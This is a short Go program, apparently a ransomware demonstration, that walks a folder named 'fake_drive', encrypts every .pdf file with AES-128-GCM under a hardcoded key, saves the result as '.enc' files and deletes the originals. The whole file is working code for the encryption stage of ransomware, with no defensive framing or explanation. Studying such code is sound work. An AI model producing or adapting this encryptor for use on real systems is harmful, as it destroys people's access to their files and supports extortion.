package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func main() {
	dirPath := "fake_drive"
	aesKey := []byte("u@QCuh@TFE~2L'Gz") // 16 bytes * 8 = 128 bit
	startTime := time.Now()

	fmt.Printf("Encrypting '%s' with AES-128...\n", dirPath)

	// Walk through all files and folders inside provided dirPath
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		// Check if it is not a directory (meaning it is a file)
		// and check if it has a target file extension
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".pdf") {
			fmt.Printf("[!] Encrypting '%s'... ", info.Name())

			// Read data from a file
			data, _ := os.ReadFile(path)

			// Create new AES cipher in GCM mode
			aesKeyCypher, _ := aes.NewCipher(aesKey)
			gcm, _ := cipher.NewGCM(aesKeyCypher)

			// Make new random nounce
			nonce := make([]byte, gcm.NonceSize())
			_, err = io.ReadFull(rand.Reader, nonce)

			// Encrypt data
			encryptedData := gcm.Seal(nonce, nonce, data, nil)

			// Create new file where encrypted data will be stored
			encFile, _ := os.Create(path + ".enc")
			defer encFile.Close()

			// Write encrypted data to a new file
			encFile.Write(encryptedData)

			// Remove original file
			os.Remove(path)

			fmt.Println("DONE")
		}

		return err
	})

	if err != nil {
		fmt.Println("Error walking through the directory path: ", err)
		return
	}

	endTime := time.Now()
	duration := endTime.Sub(startTime)
	fmt.Println("------------------------------------------")
	fmt.Println("Encryption finished successfully!")
	fmt.Println("Duration:", duration)

}
